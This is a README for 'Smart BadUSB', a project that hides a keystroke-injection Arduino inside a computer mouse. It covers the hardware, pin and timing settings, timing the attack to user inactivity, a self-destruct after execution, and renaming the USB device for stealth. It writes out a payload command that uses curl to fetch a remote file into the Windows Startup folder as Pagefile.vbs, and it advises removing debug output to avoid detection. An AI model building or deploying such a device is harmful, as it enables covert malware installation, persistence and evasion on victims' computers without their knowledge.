<h1>Smart BadUSB Project</h1>

<img src="https://github.com/BhawksGit/SmartBadUSB/blob/main/images/titleSlide.png?raw=true" alt="Smart BadUSB Title Slide">

<h2>Project Overview</h2>
<p>The Smart BadUSB is a modified USB device that mimics a keyboard but is embedded within a standard USB computer mouse. It executes a malicious payload when connected to a host computer without any obvious signs of its presence, making it more discreet than a traditional BadUSB device.</p>

<h2>Key Features</h2>
<ul>
    <li>Detection of the host operating system using HID protocol.</li>
    <li>Use of a photodiode to check for mouse LED activity to determine the best time to execute the payload.</li>
    <li>Self-destruct feature that disables the Arduino after successful payload execution.</li>
</ul>

<h2>Hardware Requirements</h2>
<ul>
    <li>Arduino Pro Micro</li>
    <li>USB 2.0 Expansion Module</li>
    <li>5mm Photodiode</li>
    <li>120 Ohm Resistor</li>
    <li>26 AWG or similar Wire</li>
    <li>Micro USB Solderable Plug or a spliced phone cable</li>
    <li>Soldering Iron & Solder</li>
</ul>

<h2>Using the Program</h2>
<p>This program is designed to operate with specific pin settings and timing variables to effectively deploy a payload on Windows systems. Below are instructions on how to adjust key parameters and deploy the payload safely and effectively.</p>

<h3>Pin Configuration</h3>
<p>Do not change the pin configuration unless necessary, as they are set to match the hardware setup:</p>
<ul>
    <li><strong>photoTransistorPin</strong>: Analog pin A2, used for the phototransistor sensor.</li>
    <li><strong>VCCPin</strong>: Digital pin 15, used as VCC.</li>
    <li><strong>GNDPin</strong>: Digital pin 16, used as ground.</li>
</ul>

<h3>Timing Variables</h3>
<p>Adjust the following timing variables based on the environmental conditions and the Windows system you are targeting:</p>
<ul>
    <li><strong>interval</strong> (500 ms): Frequency at which the sensor checks are performed.</li>
    <li><strong>bootTime</strong> (5000 ms): Wait time after the device is powered on, allowing the PC to boot.</li>
    <li><strong>inactiveTime</strong> (5000 ms): Duration to consider the mouse inactive if no movement is detected.</li>
    <li><strong>lockToCoverScreenTime</strong> (65000 ms): Time to wait for the Windows lock screen to revert to the cover screen.</li>
    <li><strong>activeSensorCount</strong> (500): Count of sensor readings indicating active mouse usage before considering the mouse active.</li>
    <li><strong>activeSensorValue</strong> (1016): Sensor reading threshold to determine mouse activity. Adjust based on your phototransistor's sensitivity.</li>
</ul>

<h3>Payload Execution</h3>
<p>To modify the payload, alter the command within the <code>executePayload</code> function:</p>
<pre>
Keyboard.print("cmd /c curl -L URL -o \"%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/Pagefile.vbs\" >nul 2>&1");
</pre>
<p>Replace the URL and file path as needed for your specific payload. Ensure that the commands are compatible with the Windows command line interface.</p>
<h3>Operational Flow</h3>
<p>Upon startup, the device checks if it has executed the payload previously through EEPROM state checking. If the payload has not been executed, it continues with the boot process, waiting for the PC to boot, and detecting mouse and system activity to determine the optimal time to deploy the payload.</p>

<h3>Compatibility</h3>
<p>Currently, this program is designed to work exclusively with Windows-based systems. It leverages specific Windows features, such as the "Run" dialog and keyboard shortcuts, to execute its payload effectively.</p>
<p>Support for Mac and Linux systems is under development, focusing on adapting to different system behaviors and command execution methods specific to these platforms.</p>

<h3>Resetting the Device</h3>
<p>If you need to reset the device and clear the EEPROM:</p>
<pre>
// To reset the EEPROM, short pin 8 to ground momentarily. This clears the flag and allows the payload to be executed again.
EEPROM.write(0, 0);
</pre>

<h3>Debugging</h3>
<p>For debugging purposes, use the serial output to monitor the status and operation of the device. Ensure to disable or remove serial debugging in the final deployment to avoid detection.</p>

<h2>Renaming the Arduino Device for Obfuscation</h2>
<p>To further disguise your Smart BadUSB device, you can rename its identification to something less suspicious, such as "USB Device". This process involves using the Musinou hardware library to customize the USB device name.</p>

<h3>Steps to Rename Your Arduino Device:</h3>
<ol>
    <li><p><strong>Download the Musinou Hardware Library:</strong> Download and extract the Musinou hardware configuration files from <a href="https://liveelectronics.musinou.net/code/mididevicename/">this link</a> and place them under <code>/Users/username/Documents/Arduino/hardware/</code> on your computer.</p></li>
    <li><p><strong>Modify Device Settings:</strong> Close your Arduino IDE if it's open. Navigate to <code>/Users/username/Documents/Arduino/hardware/musinou/avr/</code> and open the <code>boards.txt</code> file. Locate the lines for your Arduino model, for example:</p>
        <pre>
micromusinou.build.vid=0x2340
micromusinou.build.pid=0x8030
micromusinou.build.usb_product="Arduino Micro Musinou"
        </pre>
        <p>Change the <code>usb_product</code> value to a generic name, in this case we'll make it "USB Device".</p>
    </li>
    <li><p><strong>Save Changes and Reopen the IDE:</strong> Save the modified <code>boards.txt</code> file. Reopen the Arduino IDE, and select "USB Device" as the board.</p></li>
    <li><p><strong>Upload Your Code:</strong> Upload your existing Smart BadUSB code to the Arduino. This process will install the code under the new device name, making it appear as a generic "USB Device" in system reports and connected devices lists.</p></li>
    <li><p><strong>Verify Device Name:</strong> Connect the Arduino to a computer. The device should now display with the new name "USB Device".</p></li>
</ol>

<p>This renaming technique adds an extra layer of stealth, making the Smart BadUSB less noticeable and suspicious when connected to a host computer.</p>

<h2>Installation and Setup</h2>
<p>Refer to the Arduino IDE for uploading the provided <code>SmartBadUSB_Program_Arduino_Pro_Micro.ino</code> script to the Arduino Pro Micro. Detailed wiring instructions and setup procedures can be found in the documentation linked below.</p>
<a href="https://github.com/BhawksGit/SmartBadUSB">GitHub Repository</a>

<p>Thank you for exploring the Smart BadUSB project. For more information or to contribute, please visit the GitHub repository linked above.</p>
